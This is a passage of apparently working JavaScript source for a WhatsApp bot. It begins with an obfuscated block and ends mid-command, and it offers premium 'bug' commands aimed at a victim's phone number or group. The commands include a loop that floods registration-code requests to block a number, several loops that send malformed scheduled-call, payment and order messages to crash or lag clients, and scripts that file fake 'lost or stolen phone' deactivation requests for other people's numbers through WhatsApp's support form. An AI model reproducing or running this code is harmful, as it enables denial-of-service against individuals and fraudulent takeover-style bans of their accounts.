_0x19935d={};_0x19935d[_0x2427a7(0x33f,0x318,0x317,0x316)+'d']=!![],_0x19935d['forwardedN'+_0x2427a7(0x2ff,0x359,0x325,0x311)+_0x15a19b(0x48d,0x494,0x4bf,0x4af)]=_0x18e95c,_0x19935d[_0x15a19b(0x51e,0x515,0x4e0,0x50f)]=_0x2427a7(0x339,0x300,0x30f,0x346)+'FE4CDF',_0x19935d[_0x15a19b(0x506,0x4e3,0x4f8,0x52a)+'t']=_0x15a19b(0x4b2,0x48f,0x4ca,0x4b1)+_0x2427a7(0x36c,0x2f3,0x32f,0x2fe),_0x19935d[_0x2427a7(0x336,0x377,0x351,0x358)+_0x2427a7(0x34a,0x33e,0x328,0x35f)]=_0x22ac8a,_0x19935d[_0x2427a7(0x2f2,0x31b,0x30a,0x2d4)]=_0x15a19b(0x506,0x4dd,0x4f5,0x501)+_0x2427a7(0x312,0x32f,0x32d,0x333);const _0x48f80b={};_0x48f80b[_0x2427a7(0x2e4,0x2f7,0x31c,0x326)]=_0x2427a7(0x369,0x317,0x348,0x368),_0x48f80b[_0x2427a7(0x377,0x320,0x354,0x357)+'o']=_0x19935d;const _0x303aff={};_0x303aff[_0x2427a7(0x353,0x34e,0x34f,0x326)+_0x2427a7(0x333,0x31c,0x335,0x326)]=_0x48f80b,await Yasam[_0x2427a7(0x379,0x359,0x356,0x385)+'ge'](target,_0x303aff,{});const _0x59a15e={};_0x59a15e[_0x2427a7(0x311,0x300,0x31c,0x2e2)]='';const _0x569645={};_0x569645[_0x15a19b(0x4bf,0x4a3,0x4c0,0x4e4)]=xbug2,await Yasam[_0x2427a7(0x2f3,0x333,0x2fa,0x311)+'e'](target,_0x59a15e,_0x569645);}
replygcxeon(`Successfully Sent Bug To ${target}`)
}
break
case 'tempban': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Example: ${prefix + command} 91|6909137211`)
if (!/|/.test(text)) return replygcxeon(`The data you provided is invalid!, Example: \n ${prefix + command} 91|6909137211`)
let numbers = JSON.parse(fs.readFileSync('./src/tempban.json'))
let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number
await replygcxeon(`Kesuksesan! Gangguan Pendaftaran telah berhasil diaktifkan ke target : ${fullNo} untuk jangka waktu tidak terbatas. Gangguan registrasi akan dihentikan jika server di-restart, ditutup`)
let { state, saveCreds } = await useMultiFileAuthState('session')
let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Nomor Tidak Valid (Kemungkinan Registrasi Terganggu): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./src/tempban.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break
case 'iosq':{
if (!isPremium) return replygcxeon(mess.prem)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
Yasam.relayMessage(from,{
extendedTextMessage:{
"text":'.',
"contextInfo": {
"stanzaId": victim,
"participant": victim,
"quotedMessage": {
"conversation": xeontext1
},
"disappearingMode": {
"initiator": "CHANGED_IN_CHAT",
"trigger": "CHAT_SETTING"
}
},
"inviteLinkGroupTypeV2": "DEFAULT"
}
},{messageId: null})
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'iosgoogle': {
if (!isPremium) return replygcxeon(mess.prem)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
Yasam.sendMessage(victim,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: xeontext6,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'iosgoogle2': {
if (!isPremium) return replygcxeon(mess.prem)
if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
Yasam.sendMessage(m.chat,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: xeontext6,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break
case 'xioscrash':
if (!isPremium) return replygcxeon(mess.prem)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
Yasam.relayMessage(victim,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'xioscrash2':{
if (!isPremium) return replygcxeon(mess.prem)
if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
Yasam.relayMessage(m.chat,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break
case 'xcrash':{
if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "100"
for (let i = 0; i < amount; i++) {
XeonyCrashy(pushname,victim)
await sleep(3000)
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'xcrash2':
if (!isPremium) return replygcxeon(mess.prem)
if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
XeonyCrashy(pushname,m.chat)
await sleep(3000)
}
replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'amountbug': {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return relygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Yasam.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'pmbug' :{
 if (!isPremium) return replygcxeon(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
 await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Yasam.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'delaybug' : {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Yasam.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'docubug': {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
if (args.length < 1) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Yasam.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'unlimitedbug' : {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Yasam.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'bombug': {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Yasam.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'lagbug' : {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Yasam.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'trollybug': {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
Yasam.relayMessage(victim, order.message, { messageId: order.key.id })
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'gcbug' : {
if (!isPremium) return replygcxeon(mess.premium)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await Yasam.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Yasam.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'delaygcbug' :  {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await Yasam.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext5
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Yasam.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'laggcbug' :  {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await Yasam.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Yasam.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'bomgcbug' :  {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await haikal.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Yasam.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'unlimitedgcbug' :  {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await Yasam.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Yasam.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'trollygcbug' :  {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await Yasam.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
Yasam.relayMessage(xeongc, order.message, { messageId: order.key.id })
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
}
break
case 'docugcbug' :  {
if (!isPremium) return replygcxeon(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await Yasam.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
Yasam.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
} 
break

//ban/unban cases
case 'out': case 'verif':{
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await Yasam.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Yasam.sendMessage(from, { text: util.format(res.data)}, { quoted: fvrif })
}
break
case 'banv1': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await Yasam.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Yasam.sendMessage(from, { text: util.format(res.data)}, { quoted: fvrif })
}
break
case 'banv2': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await Yasam.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Yasam.sendMessage(from, { text: util.format(res.data)}, { quoted: fvrif })
}
break
case 'banv3': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await Yasam.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Yasam.sendMessage(from, { text: util.format(res.data)}, { quoted: fvrif })
}
break
case 'banv4': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await Yasam.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Yasam.sendMessage(from, { text: util.format(res.data)}, { quoted: fvrif })
}
break
case 'banv5': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await Yasam.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
